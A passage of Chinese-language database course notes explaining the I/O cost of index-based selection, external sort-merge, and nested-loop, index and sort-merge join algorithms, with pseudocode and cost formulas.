<p>Linear Search 和 Binary Search 都是基于文件扫描的搜索算法，但它们在性能上有显著差异。</p>
<p>Linear Search 的优点是：</p>
<ul>
<li>适用于任何选择条件</li>
<li>不需要预先排序</li>
<li>实现简单</li>
</ul>
<p>Binary Search 的优点是：</p>
<ul>
<li>适用于等值比较</li>
<li>需要预先排序</li>
<li>实现复杂</li>
<li>性能更好</li>
</ul>
</div>
<hr />
<h3 id="note-db-query-index-scan">Index Scan<a class="headerlink" href="#note-db-query-index-scan" title="Permanent link">&para;</a></h3>
<p>顾名思义，索引扫描就是利用索引进行扫描。</p>
<h3 id="note-db-query-a3-primary-index-equality">A3 - Primary Index - Equality<a class="headerlink" href="#note-db-query-a3-primary-index-equality" title="Permanent link">&para;</a></h3>
<ul>
<li>适用条件：在关系的键属性上建立了主索引，且查询是等值条件</li>
<li>检索满足等值条件的单个记录</li>
<li>成本 = <span class="arithmatex">\((h_i + 1) \times (t_T + t_S)\)</span><ul>
<li>其中 <span class="arithmatex">\(h_i\)</span> 为索引树的高度(与数据结构定义略有不同，这里指的是一共有多少层，也就是从1开始)</li>
<li>索引扫描需要 <span class="arithmatex">\(h_i\)</span> 次读取操作找到索引项</li>
<li>加 1 是因为需要一次额外的读取操作来访问包含目标记录的数据块</li>
</ul>
</li>
</ul>
<figure>
<img alt="" src="../NOTE/DB/img/q1.png" width="500" />

<figcaption>主索引等值查询</figcaption>
</figure>
<p>首先，我们需要从索引根节点开始，逐层向下搜索，每次需要一次seek操作将磁头定位到索引块，一次transfer操作读取该索引块的内容，这个过程重复<span class="arithmatex">\(h_i\)</span>次（索引树的高度），找到叶子节点中的索引项后，还需要一次额外操作来访问实际数据块：再一次seek操作来将磁头定位到包含目标记录的数据块，一次transfer操作来读取该数据块。</p>
<h3 id="note-db-query-a4-primary-index-equality-on-non-key">A4 - Primary Index - Equality on Non-key<a class="headerlink" href="#note-db-query-a4-primary-index-equality-on-non-key" title="Permanent link">&para;</a></h3>
<ul>
<li>适用条件：在关系的非键属性上建立了主索引，且查询是等值条件</li>
<li>检索满足条件的多个记录，这些记录通常位于连续的数据块中</li>
<li>成本 = <span class="arithmatex">\(h_i \times (t_T + t_S) + t_S + t_T \times b\)</span><ul>
<li>其中 <span class="arithmatex">\(h_i\)</span> 为索引树高度</li>
<li><span class="arithmatex">\(b\)</span> 为包含匹配记录的块数量</li>
<li><span class="arithmatex">\(h_i \times (t_T + t_S)\)</span> 用于在索引中查找第一个匹配的索引项</li>
<li><span class="arithmatex">\(t_S\)</span> 用于将磁头定位到第一个包含匹配记录的数据块</li>
<li><span class="arithmatex">\(t_T \times b\)</span> 用于读取所有包含匹配记录的连续块</li>
</ul>
</li>
</ul>
<figure>
<img alt="" src="../NOTE/DB/img/q2.png" width="500" />

<figcaption>主索引非键等值查询</figcaption>
</figure>
<p>与A3类似，不过找到叶子节点后有多个block需要读取，所以需要<span class="arithmatex">\(t_T \times b\)</span></p>
<h3 id="note-db-query-a5-secondary-index-equality-on-non-key">A5 - Secondary Index - Equality on Non-key<a class="headerlink" href="#note-db-query-a5-secondary-index-equality-on-non-key" title="Permanent link">&para;</a></h3>
<ul>
<li>适用条件：在关系的非键属性上建立了二级索引，且查询是等值条件</li>
<li>检索匹配记录的行为取决于搜索键是否为候选键<ul>
<li>如果搜索键是候选键（检索单条记录）成本 = <span class="arithmatex">\((h_i + 1) \times (t_T + t_S)\)</span></li>
<li>如果搜索键不是候选键（检索多条记录）每个匹配的记录可能位于不同的数据块中，成本 = <span class="arithmatex">\((h_i + m + n) \times (t_T + t_S)\)</span><ul>
<li>首先通过索引树查找（<span class="arithmatex">\(h_i\)</span> 次操作），然后读取包含记录指针的叶子节点（<span class="arithmatex">\(m\)</span> 次操作）最后根据指针读取实际记录（<span class="arithmatex">\(n\)</span> 次操作）</li>
<li>这种情况开销非常大！可能比线性扫描更糟糕</li>
<li>每次读取一条记录都需要一次独立的I/O操作</li>
</ul>
</li>
</ul>
</li>
</ul>
<figure>
<img alt="" src="../NOTE/DB/img/q3.png" width="500" />

<figcaption>二级索引非键等值查询</figcaption>
</figure>
<hr />
<p>如比较符<code>&gt;, &lt;, &gt;=,&lt;=,&lt;&gt;</code> 与等值比较的不同之处在于其选择范围更大</p>
<h3 id="note-db-query-a6-primary-index-range">A6 - Primary Index - Range<a class="headerlink" href="#note-db-query-a6-primary-index-range" title="Permanent link">&para;</a></h3>
<ul>
<li>适用条件：在关系的某属性上建立了主索引，且查询是范围条件</li>
<li>使用索引找到范围的第一个值，然后顺序扫描关系</li>
<li>成本 = <span class="arithmatex">\(h_i \times (t_T + t_S) + t_S + t_T \times b\)</span></li>
<li>其中 <span class="arithmatex">\(b\)</span> 是范围内所有匹配记录占用的块数量</li>
<li>类似于A4的成本结构</li>
</ul>
<h3 id="note-db-query-a7-secondary-index-comparison">A7 - Secondary Index - Comparison<a class="headerlink" href="#note-db-query-a7-secondary-index-comparison" title="Permanent link">&para;</a></h3>
<ul>
<li>
<p>适用于辅助索引上的比较操作（如 <span class="arithmatex">\(\sigma_{A \geq v}(r)\)</span> 或 <span class="arithmatex">\(\sigma_{A &lt; v}(r)\)</span>）</p>
</li>
<li>
<p>对于 <span class="arithmatex">\(\sigma_{A \geq v}(r)\)</span>：使用索引找到第一个值 <span class="arithmatex">\(\geq v\)</span> 的索引项，然后顺序扫描索引找出所有指向的记录</p>
</li>
<li>
<p>对于 <span class="arithmatex">\(\sigma_{A &lt; v}(r)\)</span>：从索引开始顺序扫描，直到找到第一个 <span class="arithmatex">\(\geq v\)</span> 的值为止</p>
</li>
<li>
<p>在任何情况下，都需要获取指向的记录</p>
<ul>
<li>每个记录需要一次I/O操作</li>
<li>线性文件扫描可能更划算</li>
</ul>
</li>
</ul>
<hr />
<h3 id="note-db-query-implementation-of-complex-selections">Implementation of complex Selections<a class="headerlink" href="#note-db-query-implementation-of-complex-selections" title="Permanent link">&para;</a></h3>
<p>如果有多个条件的合取：<span class="arithmatex">\(\sigma_{\theta_1 \wedge \theta_2 \wedge \ldots \wedge \theta_n}(r)\)</span></p>
<h4 id="note-db-query-a8-conjunctive-selection-using-one-index">A8 - conjunctive selection using one index)<a class="headerlink" href="#note-db-query-a8-conjunctive-selection-using-one-index" title="Permanent link">&para;</a></h4>
<ul>
<li>
<p>选择一个条件 <span class="arithmatex">\(\theta_i\)</span> 和算法A1到A7中的一个，使得处理 <span class="arithmatex">\(\sigma_{\theta_i}(r)\)</span> 的成本最小</p>
</li>
<li>
<p>在内存缓冲区中检查获取的元组是否满足其他条件</p>
</li>
<li>
<p>这种方法适用于一个条件的选择性非常高的情况，其他条件可以在内存中高效验证</p>
</li>
</ul>
<h4 id="note-db-query-a9-conjunctive-selection-using-one-index">A9 - conjunctive selection using one index)<a class="headerlink" href="#note-db-query-a9-conjunctive-selection-using-one-index" title="Permanent link">&para;</a></h4>
<ul>
<li>如果有可用的组合索引（即多键索引），可以直接使用它处理多个条件</li>
<li>这种方法比单独处理每个条件更高效</li>
</ul>
<h4 id="note-db-query-a10-conjunctive-selection-using-one-index">A10 - conjunctive selection using one index)<a class="headerlink" href="#note-db-query-a10-conjunctive-selection-using-one-index" title="Permanent link">&para;</a></h4>
<ul>
<li>如果多个条件各有对应的索引，可以：<ul>
<li>使用每个索引获取满足对应条件的记录指针集合</li>
<li>计算所有这些集合的交集，确定同时满足所有条件的记录</li>
<li>从文件中读取这些记录</li>
</ul>
</li>
<li>如果某些条件没有合适的索引，在内存中应用测试</li>
</ul>
<hr />
<p>如果是多个条件的析取：<span class="arithmatex">\(\sigma_{\theta_1 \vee \theta_2 \vee \ldots \vee \theta_n}(r)\)</span></p>
<h4 id="note-db-query-a11-disjunctive-selection-using-one-index">A11 - disjunctive selection using one index)<a class="headerlink" href="#note-db-query-a11-disjunctive-selection-using-one-index" title="Permanent link">&para;</a></h4>
<ul>
<li>适用条件：所有条件都有可用索引，否则使用线性扫描</li>
<li>使用每个条件对应的索引，获取满足条件的记录指针集合</li>
<li>计算所有这些集合的并集</li>
<li>从文件中读取这些记录</li>
</ul>
<hr />
<h4 id="note-db-query-a12-negation-using-one-index">A12 - negation using one index)<a class="headerlink" href="#note-db-query-a12-negation-using-one-index" title="Permanent link">&para;</a></h4>
<p>否定条件形式为：<span class="arithmatex">\(\sigma_{\neg \theta}(r)\)</span></p>
<ul>
<li>通常使用文件的线性扫描</li>
<li>如果很少记录满足 <span class="arithmatex">\(\neg \theta\)</span>，且 <span class="arithmatex">\(\theta\)</span> 有可用索引：<ul>
<li>使用索引找到满足 <span class="arithmatex">\(\theta\)</span> 的记录</li>
<li>获取这些记录</li>
<li>计算补集得到满足 <span class="arithmatex">\(\neg \theta\)</span> 的记录</li>
</ul>
</li>
</ul>
<h2 id="note-db-query-sorting">Sorting<a class="headerlink" href="#note-db-query-sorting" title="Permanent link">&para;</a></h2>
<blockquote>
<p><a href="#note-ads-wk14">此事在ADS亦有记载</a></p>
</blockquote>
<p>排序是数据库查询处理中的基础操作，有两个主要使用场景：</p>
<ol>
<li>响应需要有序输出的查询</li>
<li>加速连接操作的实现</li>
</ol>
<p>数据库系统需要能够处理比内存大的数据集的排序。实现方式主要有：</p>
<h3 id="note-db-query-internal-sort">Internal Sort<a class="headerlink" href="#note-db-query-internal-sort" title="Permanent link">&para;</a></h3>
<ul>
<li>适用于能够完全装入内存的关系</li>
<li>可以使用快速排序（quicksort）等高效的内存排序算法</li>
</ul>
<h3 id="note-db-query-external-sort-merge">External Sort-Merge<a class="headerlink" href="#note-db-query-external-sort-merge" title="Permanent link">&para;</a></h3>
<ul>
<li>适用于无法完全装入内存的大型关系</li>
<li>采用多路归并排序（external sort-merge）算法</li>
</ul>
<h3 id="note-db-query-external-sort-merge-algorithm">External Sort-Merge Algorithm<a class="headerlink" href="#note-db-query-external-sort-merge-algorithm" title="Permanent link">&para;</a></h3>
<p>假设 <span class="arithmatex">\(M\)</span> 表示可用内存大小（以页或块为单位）：</p>
<ul>
<li>
<p><strong>创建有序段（runs）</strong>：</p>
<ul>
<li>初始化 <span class="arithmatex">\(i = 0\)</span></li>
<li>重复以下步骤直到处理完整个关系：<ul>
<li>(a) 读取 <span class="arithmatex">\(M\)</span> 个数据块到内存</li>
<li>(b) 在内存中对数据块进行排序</li>
<li>&copy; 将排序后的数据写入到段 <span class="arithmatex">\(R_i\)</span>，并递增 <span class="arithmatex">\(i\)</span></li>
</ul>
</li>
<li>最终 <span class="arithmatex">\(i\)</span> 的值为 <span class="arithmatex">\(N\)</span>（段的数量）</li>
</ul>
</li>
<li>
<p><strong>合并段（N-路合并）</strong>：</p>
<ul>
<li>假设 <span class="arithmatex">\(N &lt; M\)</span>（段数不超过内存容量）：<ul>
<li>使用 <span class="arithmatex">\(N\)</span> 个内存块作为输入缓冲区，1个块作为输出缓冲区</li>
<li>从每个段读取第一个块到各自的缓冲区</li>
<li>反复执行：</li>
<li>选择所有缓冲区中排序值最小的记录</li>
<li>将该记录写入输出缓冲区（缓冲区满时写入磁盘）</li>
<li>从原缓冲区删除该记录，缓冲区空时从对应段读取下一块</li>
<li>直到所有输入缓冲区都为空</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>当 <span class="arithmatex">\(N \geq M\)</span> 时，需要多次合并传递：</p>
<ul>
<li>每次传递合并 <span class="arithmatex">\(M-1\)</span> 个连续段</li>
<li>一次传递将段数减少为原来的 <span class="arithmatex">\(\frac{1}{M-1}\)</span> ，同时每个段的长度增加相同倍数</li>
<li>重复传递直到所有段合并为一个</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>If M=11, and there are 90 runs, one pass reduces the number of runs to 9, each 10 times the size of the initial runs.</p>
</div>
<figure>
<img alt="" src="../NOTE/DB/img/q4.png" width="500" />

<figcaption>外部排序-合并</figcaption>
</figure>
<h3 id="note-db-query-external-sort-merge-cost-analysis">External Sort-Merge Cost Analysis<a class="headerlink" href="#note-db-query-external-sort-merge-cost-analysis" title="Permanent link">&para;</a></h3>
<ul>
<li>
<p><strong>合并传递次数</strong>：</p>
<ul>
<li>需要 <span class="arithmatex">\(\lceil\log_{M-1}(b_r/M)\rceil\)</span> 次合并传递</li>
<li>其中 <span class="arithmatex">\(b_r\)</span> 是关系 <span class="arithmatex">\(r\)</span> 的块数</li>
</ul>
</li>
<li>
<p><strong>块传输次数</strong>：</p>
</li>
</ul>
<p>在外部排序-合并算法中，每个数据块通常需要经历一次读取和一次写入操作。
具体来说：</p>
<ol>
<li>
<p>在初始段创建阶段，每个块需要从磁盘读入内存（一次读取），排序后再写回磁盘形成有序段（一次写入）</p>
</li>
<li>
<p>在每次合并传递中，同样需要从磁盘读取数据块（一次读取），然后将合并后的结果写回磁盘（一次写入）</p>
</li>
</ol>
<p>因此，对于整个关系的 <span class="arithmatex">\(b_r\)</span> 个块，在每个阶段（初始段创建和每次合并传递）都需要 <span class="arithmatex">\(2b_r\)</span> 次传输操作（<span class="arithmatex">\(b_r\)</span> 次读取 + <span class="arithmatex">\(b_r\)</span> 次写入）。</p>
<p>唯一的例外是最后一次合并传递，通常不计算写入成本，因为结果可能直接传递给下一个操作而不必写回磁盘。所以总传输次数为：</p>
<ul>
<li>初始段创建：<span class="arithmatex">\(2b_r\)</span> 次传输（<span class="arithmatex">\(b_r\)</span> 读 + <span class="arithmatex">\(b_r\)</span> 写）</li>
<li>前 <span class="arithmatex">\(\lceil\log_{M-1}(b_r/M)\rceil - 1\)</span> 次合并传递：每次 <span class="arithmatex">\(2b_r\)</span> 传输</li>
<li>最后一次合并传递：只有 <span class="arithmatex">\(b_r\)</span> 次读取操作</li>
</ul>
<p>一共</p>
<div class="arithmatex">\[
    b_r \times (2 \times \lceil\log_{M-1}(b_r/M)\rceil + 1)
\]</div>
<ul>
<li><strong>寻道次数</strong>：</li>
</ul>
<p><strong>段生成阶段</strong>：</p>
<ul>
<li>对于每个长度为M的段，需要一次寻道来读取这个段的数据，一次寻道来写入排序后的结果</li>
<li>总共有 <span class="arithmatex">\(\lceil b_r/M \rceil\)</span> 个段，所以需要 <span class="arithmatex">\(2\lceil b_r/M \rceil\)</span> 次寻道</li>
</ul>
<p><strong>合并阶段</strong>：</p>
<ul>
<li>在每次合并传递中，我们需要读取和写入块</li>
<li><span class="arithmatex">\(b_B\)</span> 是缓冲区大小，表示在一次I/O操作中可以读/写的块数</li>
<li>读取时，每读取 <span class="arithmatex">\(b_B\)</span> 个块需要一次寻道，所以读取 <span class="arithmatex">\(b_r\)</span> 个块需要 <span class="arithmatex">\(\lceil b_r/b_B \rceil\)</span> 次寻道</li>
<li>写入也是类似的，需要 <span class="arithmatex">\(\lceil b_r/b_B \rceil\)</span> 次寻道</li>
<li>因此每次合并传递需要 <span class="arithmatex">\(2\lceil b_r/b_B \rceil\)</span> 次寻道</li>
<li>最后一次合并传递不需要写回磁盘，所以不计算写入寻道次数</li>
<li>合并传递总次数是 <span class="arithmatex">\(\lceil\log_{M-1}(b_r/M)\rceil\)</span>，其中最后一次只需要读取的寻道</li>
<li>所以合并阶段的寻道次数为 <span class="arithmatex">\(\lceil b_r/b_B \rceil(2\lceil\log_{M-1}(b_r/M)\rceil - 1)\)</span></li>
</ul>
<p><strong>总寻道次数</strong> 就是段生成和合并阶段的寻道次数之和</p>
<p>为</p>
<div class="arithmatex">\[
    2\lceil b_r/M \rceil + \lceil b_r/b_B \rceil(2\lceil\log_{M-1}(b_r/M)\rceil - 1)
\]</div>
<h2 id="note-db-query-join-operation">Join Operation<a class="headerlink" href="#note-db-query-join-operation" title="Permanent link">&para;</a></h2>
<p>连接操作是关系数据库中最重要的操作之一，它将两个关系中满足特定条件的元组合并起来。</p>
<h3 id="note-db-query-nested-loop-join">Nested-Loop Join<a class="headerlink" href="#note-db-query-nested-loop-join" title="Permanent link">&para;</a></h3>
<p>最简单的连接算法是嵌套循环连接：</p>
<div class="language-py highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="special"><a href="#note-db-query-__codelineno-0-1">1</a></span>
<span class="special"><a href="#note-db-query-__codelineno-0-2">2</a></span>
<span class="special"><a href="#note-db-query-__codelineno-0-3">3</a></span>
<span class="special"><a href="#note-db-query-__codelineno-0-4">4</a></span>
<span class="special"><a href="#note-db-query-__codelineno-0-5">5</a></span>
<span class="special"><a href="#note-db-query-__codelineno-0-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a><span class="k">for</span> <span class="n">each</span> <span class="nb">tuple</span> <span class="n">tr</span> <span class="ow">in</span> <span class="n">relation</span> <span class="n">r</span> <span class="n">do</span> <span class="n">begin</span>
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2"></a>    <span class="k">for</span> <span class="n">each</span> <span class="nb">tuple</span> <span class="n">ts</span> <span class="ow">in</span> <span class="n">relation</span> <span class="n">s</span> <span class="n">do</span> <span class="n">begin</span>
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3"></a>        <span class="n">test</span> <span class="n">pair</span> <span class="p">(</span><span class="n">tr</span><span class="p">,</span><span class="n">ts</span><span class="p">)</span> <span class="n">to</span> <span class="n">see</span> <span class="k">if</span> <span class="n">they</span> <span class="n">satisfy</span> <span class="n">the</span> <span class="n">join</span> <span class="n">condition</span> <span class="n">θ</span>
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4"></a>        <span class="k">if</span> <span class="n">they</span> <span class="n">do</span><span class="p">,</span> <span class="n">add</span> <span class="n">tr</span> <span class="err">•</span> <span class="n">ts</span> <span class="n">to</span> <span class="n">the</span> <span class="n">result</span><span class="o">.</span>
</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5"></a>    <span class="n">end</span>
</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6"></a><span class="n">end</span>
</span></code></pre></div></td></tr></table></div>
<ul>
<li><span class="arithmatex">\(r\)</span> 被称为外部关系(outer relation)，<span class="arithmatex">\(s\)</span> 被称为内部关系(inner relation)</li>
<li>不需要索引，可用于任何类型的连接条件</li>
<li>代价高昂，因为需要检查两个关系中所有元组对</li>
</ul>
<h4 id="note-db-query-cost">Cost<a class="headerlink" href="#note-db-query-cost" title="Permanent link">&para;</a></h4>
<p>在最坏情况下，如果内存只能容纳每个关系的一个块：
- 块传输次数：<span class="arithmatex">\(n_r \times b_s + b_r\)</span>
- 寻道次数：<span class="arithmatex">\(n_r + b_r\)</span></p>
<div class="admonition info">
<p class="admonition-title">explanation</p>
<ul>
<li>块传输 <span class="arithmatex">\(b_r\)</span>：首先需要读取外部关系r的所有块一次</li>
<li>块传输 <span class="arithmatex">\(n_r \times b_s\)</span>：对于r中的每个元组(<span class="arithmatex">\(n_r\)</span>个)，都需要扫描s的所有块(<span class="arithmatex">\(b_s\)</span>个)</li>
<li>寻道 <span class="arithmatex">\(b_r\)</span>：读取外部关系需要的寻道次数</li>
<li>寻道 <span class="arithmatex">\(n_r\)</span>：每处理一个外部元组时，都需要重新定位到内部关系的起始位置，需要一次寻道</li>
</ul>
</div>
<p>如果较小的关系能完全装入内存，应该将其用作内部关系：</p>
<ul>
<li>
<p>块传输次数降为 <span class="arithmatex">\(b_r + b_s\)</span>,读入两个关系</p>
</li>
<li>
<p>寻道次数降为 2，两个关系的寻道</p>
</li>
</ul>
<h3 id="note-db-query-block-nested-loop-join">Block Nested-Loop Join<a class="headerlink" href="#note-db-query-block-nested-loop-join" title="Permanent link">&para;</a></h3>
<p>块嵌套循环连接是嵌套循环连接的优化版本，以块为单位而不是元组为单位进行处理：</p>
<div class="language-py highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="special"><a href="#note-db-query-__codelineno-1-1"> 1</a></span>
<span class="special"><a href="#note-db-query-__codelineno-1-2"> 2</a></span>
<span class="special"><a href="#note-db-query-__codelineno-1-3"> 3</a></span>
<span class="special"><a href="#note-db-query-__codelineno-1-4"> 4</a></span>
<span class="special"><a href="#note-db-query-__codelineno-1-5"> 5</a></span>
<span class="special"><a href="#note-db-query-__codelineno-1-6"> 6</a></span>
<span class="special"><a href="#note-db-query-__codelineno-1-7"> 7</a></span>
<span class="special"><a href="#note-db-query-__codelineno-1-8"> 8</a></span>
<span class="special"><a href="#note-db-query-__codelineno-1-9"> 9</a></span>
<span class="special"><a href="#note-db-query-__codelineno-1-10">10</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a><span class="k">for</span> <span class="n">each</span> <span class="n">block</span> <span class="n">Br</span> <span class="n">of</span> <span class="n">r</span> <span class="n">do</span> <span class="n">begin</span>
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2"></a>    <span class="k">for</span> <span class="n">each</span> <span class="n">block</span> <span class="n">Bs</span> <span class="n">of</span> <span class="n">s</span> <span class="n">do</span> <span class="n">begin</span>
</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3"></a>        <span class="k">for</span> <span class="n">each</span> <span class="nb">tuple</span> <span class="n">tr</span> <span class="ow">in</span> <span class="n">Br</span> <span class="n">do</span> <span class="n">begin</span>
</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4"></a>            <span class="k">for</span> <span class="n">each</span> <span class="nb">tuple</span> <span class="n">ts</span> <span class="ow">in</span> <span class="n">Bs</span> <span class="n">do</span> <span class="n">begin</span>
</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5"></a>                <span class="n">Check</span> <span class="k">if</span> <span class="p">(</span><span class="n">tr</span><span class="p">,</span><span class="n">ts</span><span class="p">)</span> <span class="n">satisfy</span> <span class="n">the</span> <span class="n">join</span> <span class="n">condition</span>
</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6"></a>                <span class="k">if</span> <span class="n">they</span> <span class="n">do</span><span class="p">,</span> <span class="n">add</span> <span class="n">tr</span> <span class="err">•</span> <span class="n">ts</span> <span class="n">to</span> <span class="n">the</span> <span class="n">result</span><span class="o">.</span>
</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7"></a>            <span class="n">end</span>
</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8"></a>        <span class="n">end</span>
</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9"></a>    <span class="n">end</span>
</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10"></a><span class="n">end</span>
</span></code></pre></div></td></tr></table></div>
<h4 id="note-db-query-cost_1">Cost<a class="headerlink" href="#note-db-query-cost_1" title="Permanent link">&para;</a></h4>
<p>最坏情况估计：</p>
<ul>
<li>块传输次数：<span class="arithmatex">\(b_r \times b_s + b_r = b_r(b_s + 1)\)</span></li>
<li>寻道次数：<span class="arithmatex">\(2 \times b_r\)</span></li>
</ul>
<p><strong>I/O成本分析详解</strong>：
- 块传输 <span class="arithmatex">\(b_r\)</span>：读取外部关系的所有块一次
- 块传输 <span class="arithmatex">\(b_r \times b_s\)</span>：对于外部关系的每个块，都需要读取内部关系的所有块进行匹配
- 寻道 <span class="arithmatex">\(b_r\)</span>：读取外部关系需要的寻道次数
- 寻道 <span class="arithmatex">\(b_r\)</span>：对于外部关系的每个块，都需要一次寻道来访问内部关系</p>
<p>对比嵌套循环连接，块嵌套循环连接显著减少了寻道次数，从 <span class="arithmatex">\(n_r\)</span> 减少到 <span class="arithmatex">\(b_r\)</span>，这是因为以块为单位处理减少了对内部关系的重复访问。因为通常 <span class="arithmatex">\(n_r \gg b_r\)</span>（元组数远大于块数），所以这种优化非常有效。</p>
<h4 id="note-db-query-improvement">Improvement<a class="headerlink" href="#note-db-query-improvement" title="Permanent link">&para;</a></h4>
<p>在改进的块嵌套循环连接中，假设内存可以容纳M个块：
1. 我们分配M-2个块来存储外部关系的数据
2. 剩余的1个块用于读取内部关系的数据
3. 另外1个块用于输出缓冲区</p>
<p>这种分配方式的优势在于：</p>
<ul>
<li>可以一次读取外部关系的多个块(M-2个)到内存中</li>
<li>然后将这M-2个块与内部关系的每个块进行连接操作</li>
<li>这样内部关系只需要被扫描 <span class="arithmatex">\(\lceil b_r/(M-2) \rceil\)</span> 次，而不是 <span class="arithmatex">\(b_r\)</span> 次</li>
</ul>
<p>这使得I/O成本显著降低：
- 块传输次数：<span class="arithmatex">\(\lceil b_r/(M-2) \rceil \times b_s + b_r\)</span>
- 寻道次数：<span class="arithmatex">\(2 \times \lceil b_r/(M-2) \rceil\)</span></p>
<p>当M很大时，<span class="arithmatex">\(\lceil b_r/(M-2) \rceil\)</span> 可能会接近1，这意味着内部关系几乎只需要被扫描一次，极大地提高了连接操作的效率。</p>
<p>这种优化充分利用了可用内存，是数据库查询优化中的一个重要技术。</p>
<figure>
<img alt="" src="../NOTE/DB/img/q5.png" width="500" />

<figcaption>优化</figcaption>
</figure>
<div class="admonition summary">
<p class="admonition-title">Summary</p>
<p>其实优化的想法是减少外部循环的次数，从<span class="arithmatex">\(n_r\)</span>到<span class="arithmatex">\(b_r\)</span>到<span class="arithmatex">\(\lceil b_r/(M-2) \rceil\)</span></p>
<p>进一步优化：</p>
<ul>
<li>如果连接属性是内部关系的键，在第一次匹配后停止内部循环</li>
<li>交替正向和反向扫描内部循环，利用缓冲区中剩余的块</li>
<li>如果内部关系有索引，可以使用它加速查找</li>
</ul>
</div>
<h3 id="note-db-query-index-nested-loop-join">Index Nested-Loop Join<a class="headerlink" href="#note-db-query-index-nested-loop-join" title="Permanent link">&para;</a></h3>
<p>如果内部关系在连接属性上有索引，可以使用索引嵌套循环连接：</p>
<ul>
<li>
<p>索引可以替代文件扫描，前提是：</p>
<ul>
<li>连接是等值连接或自然连接</li>
<li>内部关系在连接属性上有可用索引（或可以构建临时索引）</li>
</ul>
</li>
<li>
<p>基本算法：
<div class="language-py highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="special"><a href="#note-db-query-__codelineno-2-1">1</a></span>
<span class="special"><a href="#note-db-query-__codelineno-2-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a><span class="k">for</span> <span class="n">each</span> <span class="nb">tuple</span> <span class="n">tr</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">outer</span> <span class="n">relation</span> <span class="n">r</span><span class="p">:</span>
</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2"></a>    <span class="n">use</span> <span class="n">the</span> <span class="n">index</span> <span class="n">to</span> <span class="n">look</span> <span class="n">up</span> <span class="n">tuples</span> <span class="ow">in</span> <span class="n">s</span> <span class="n">that</span> <span class="n">satisfy</span> <span class="n">the</span> <span class="n">join</span> <span class="n">condition</span> <span class="k">with</span> <span class="nb">tuple</span> <span class="n">tr</span>
</span></code></pre></div></td></tr></table></div></p>
</li>
<li>
<p>最坏情况：只需一页内存缓冲区，每个外部关系的元组需要一次索引查找</p>
</li>
<li>成本计算：<span class="arithmatex">\(b_r \times (t_T + t_S) + n_r \times c\)</span></li>
<li>其中 <span class="arithmatex">\(c\)</span> 是使用索引查找并获取所有匹配元组的成本</li>
<li><span class="arithmatex">\(c\)</span> 可以估计为针对连接条件的单个选择操作成本</li>
<li>
<p>成本包含读取外部关系和对每个元组执行索引操作，这里没有内部关系是因为外部寻找的过程就是将其与内部关系做比对了；</p>
</li>
<li>
<p>如果连接属性在两个关系都有索引，应选择元组数较少的关系作为外部关系</p>
</li>
</ul>
<h3 id="note-db-query-sort-merge-join">Sort-Merge Join<a class="headerlink" href="#note-db-query-sort-merge-join" title="Permanent link">&para;</a></h3>
<p>当两个关系按连接属性排序或可以先排序再连接时，排序合并连接非常有效：</p>
<h4 id="note-db-query-algorithm">Algorithm<a class="headerlink" href="#note-db-query-algorithm" title="Permanent link">&para;</a></h4>
<ol>
<li>
<p><strong>排序阶段</strong>：对关系r按连接属性排序（如果尚未排序）,对关系s按连接属性排序（如果尚未排序）</p>
</li>
<li>
<p><strong>合并阶段</strong>：类似于排序算法的合并阶段,主要区别是处理连接属性中的重复:对于连接属性值相同的每对元组，都需要生成一个连接结果</p>
</li>
</ol>
<h4 id="note-db-query-features">Features<a class="headerlink" href="#note-db-query-features" title="Permanent link">&para;</a></h4>
<ul>
<li>仅适用于等值连接和自然连接</li>
<li>每个块只需读取一次（假设所有给定连接属性值的元组都能放入内存）</li>
<li>成本分析：<ul>
<li>块传输次数：<span class="arithmatex">\(b_r + b_s\)</span> 次传输 + 排序成本</li>
<li>寻道次数：<span class="arithmatex">\(\lceil b_r/b_B \rceil + \lceil b_s/b_B \rceil\)</span> 次</li>
</ul>
</li>
</ul>
<figure>
<img alt="" src="../NOTE/DB/img/q6.png" width="500" />
</figure>
<p>如图所示，两个按a1列排序的关系pr和ps可以高效连接：</p>
<ul>
<li>pr包含属性a1和a2</li>
<li>ps包含属性a1和a3</li>
<li>通过合并算法，可以匹配所有连接属性值相同的元组，如(a, 3)和(a, A)</li>
</ul>
<h4 id="note-db-query-cost_2">Cost<a class="headerlink" href="#note-db-query-cost_2" title="Permanent link">&para;</a></h4>
<p>总成本 = 排序r的成本 + 排序s的成本 + 合并阶段成本(<span class="arithmatex">\(b_r + b_s\)</span>)+ <span class="arithmatex">\(\lceil b_r/ b_b \rceil\)</span> + <span class="arithmatex">\(\lceil b_s/ b_b \rceil\)</span> Seeks</p>
<p>如果关系已经按连接属性排序，则省略排序成本。</p>
<h3 id="note-db-query-hybrid-merge-join">Hybrid Merge-Join<a class="headerlink" href="#note-db-query-hybrid-merge-join" title="Permanent link">&para;</a></h3>
